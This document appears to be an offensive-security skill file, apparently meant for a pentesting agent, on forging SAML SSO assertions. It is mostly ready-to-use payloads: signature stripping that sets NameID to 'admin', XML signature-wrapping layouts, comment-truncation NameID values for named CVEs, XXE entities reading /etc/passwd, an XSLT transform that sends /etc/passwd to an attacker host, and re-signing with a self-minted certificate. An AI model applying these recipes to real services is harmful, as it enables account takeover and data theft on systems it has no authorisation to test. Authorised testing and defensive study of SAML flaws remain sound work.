# SAML assertion forgery and signature-bypass techniques — Open WHEN: recon shows a SAML SSO flow (a base64/deflated `SAMLResponse` or `SAMLRequest` POST/redirect parameter, an ACS endpoint like `/saml2/sp/acs/post` or `/Shibboleth.sso/SAML2/POST`, or a `<samlp:Response>` XML blob) and you need the exact assertion-tampering recipes

A SAML Response is XML, base64-encoded (and sometimes DEFLATE-compressed for redirect binding). Decode it first, tamper, re-encode. The whole class of bugs is: the Service Provider (SP) trusts the assertion content but checks the signature weakly, in the wrong place, or not at all. Target claim to change is the identity — `<saml2:NameID>` / `<NameID>` (set it to `admin` or a known privileged user) or an attribute like `uid`/`role`/`groups`.

Decode / re-encode a captured `SAMLResponse`:
```bash
# redirect binding (deflated): base64-decode then raw-inflate
echo '<SAMLResponse-value>' | base64 -d | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))"
# POST binding (not deflated): just base64-decode
echo '<SAMLResponse-value>' | base64 -d
# re-encode (POST binding) after editing assertion.xml:
base64 -w0 assertion.xml
```
Tooling: SAMLRaider (Burp) and the ZAP SAML add-on automate XSW and re-signing; do the XML edits by hand with `curl` if those are unavailable.

## 1. Signature stripping (no signature = trusted username)
Many default SP configs only verify a signature *if one is present*. Remove the entire `<ds:Signature>` element (from both the Response and the Assertion), set `<NameID>` to the target user, and submit. "Accepting an unsigned SAML assertion is accepting a username without checking the password." Minimal unsigned-assertion shape that names `admin`:
```xml
<saml2:Subject>
  <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml2:NameID>
  <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
    <saml2:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" Recipient="<ACS-URL>"/>
  </saml2:SubjectConfirmation>
</saml2:Subject>
```
Keep `Destination`/`Recipient`/`Audience` matching the real SP and set the `NotOnOrAfter` dates in the future so timing checks pass.

## 2. XML Signature Wrapping (XSW) — keep a valid signature, smuggle a forged assertion
The signature stays cryptographically valid over the *original* assertion, but you add a *second* forged assertion that the application logic actually reads. Works when the SP validates one element but processes another (signature-reference / processing mismatch). Eight standard variants — try each:

| Variant | Applies to | What to do |
|---|---|---|
| XSW1 | Response | Add a cloned **unsigned** copy of the Response **after** the existing signature |
| XSW2 | Response | Add a cloned **unsigned** copy of the Response **before** the existing signature |
| XSW3 | Assertion | Add a cloned **unsigned** Assertion **before** the original Assertion |
| XSW4 | Assertion | Add a cloned **unsigned** Assertion **inside** the original Assertion |
| XSW5 | Assertion | Change a value in the signed Assertion; append an unsigned copy of the original at the end |
| XSW6 | Assertion | Change a value in the signed Assertion; insert an unsigned copy after the original signature |
| XSW7 | Assertion | Wrap a cloned unsigned Assertion in an `<Extensions>` block |
| XSW8 | Assertion | Wrap a copy of the original (signature removed) in an `<Object>` block |

Layout idea — forged assertion (FA) read by the app, legitimate signed assertion (LA/LAS) keeps the signature valid:
```xml
<SAMLResponse>
  <FA ID="evil"><Subject>admin</Subject></FA>
  <LA ID="legitimate">
    <Subject>Legitimate User</Subject>
    <LAS><Reference URI="legitimate"/></LAS>
  </LA>
</SAMLResponse>
```
Give the forged element a distinct `ID` and make the signed `Reference URI` still point at the legitimate one. This is the GitHub Enterprise SAML bug pattern: a session is created for the forged `Subject` even though only the legitimate assertion is signed.

## 3. XML comment truncation (CVE-2017-11427 family)
Some XML libraries return only the text *before* an inline comment when reading a node. Inject a comment to split the `NameID` so the SP reads a different identity than the IdP signed. Affected: python-saml (CVE-2017-11427), ruby-saml (CVE-2017-11428), saml2-js (CVE-2017-11429), OmniAuth-SAML (CVE-2017-11430), Shibboleth (CVE-2018-0489), Duo Network Gateway (CVE-2018-7340).
```xml
<NameID>admin@target.com<!---->.evil.com</NameID>
```
The signature stays valid over the whole string; the buggy parser reads only `admin@target.com`, logging you in as that user. Try the comment between the local part and domain, and right after the privileged value.

## 4. XXE in the assertion to bypass signature checks
Because XML entities resolve *after* the bytes are signed, a signed assertion can carry entity references whose expansion changes the parsed value without invalidating the signature. Add a DOCTYPE and reference entities inside an attribute value:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [ <!ENTITY s "s"> <!ENTITY f1 "f1"> ]>
...
<saml2:AttributeValue>&s;taf&f1;</saml2:AttributeValue>
```
The SP reports `staf` as the attribute value. Escalate to file read with an external entity (`<!ENTITY x SYSTEM "file:///etc/passwd">`) where the parser is fully vulnerable — this overlaps with the XXE skill.

## 5. XSLT in the signature transform
The `<ds:Transforms>` block of a signature can embed an XSLT stylesheet that the SP executes during canonicalization — a file-read / SSRF gadget driven by the signature itself:
```xml
<ds:Transform>
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="doc">
      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
      <xsl:value-of select="unparsed-text(concat('http://<your-host>/', $escaped))"/>
    </xsl:template>
  </xsl:stylesheet>
</ds:Transform>
```
The file contents are exfiltrated to your host via the URL fetch.

## Self-signed / cloned certificate
If the IdP cert is self-signed (not chained to a real CA), the SP may not pin it — clone it or mint your own self-signed cert, re-sign the tampered assertion with your private key, and swap the `<ds:X509Certificate>` in the response. Mint a cert with:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout sp.key -out sp.crt
```

## Validation
A SAML finding is real only when a request carrying your tampered/unsigned/wrapped assertion is accepted and yields a session for an identity you did not legitimately authenticate as. False positives: the SP rejects unsigned assertions, pins the IdP cert, validates the signature reference against the processed element, or enforces `Audience`/`Destination`/`NotOnOrAfter`.
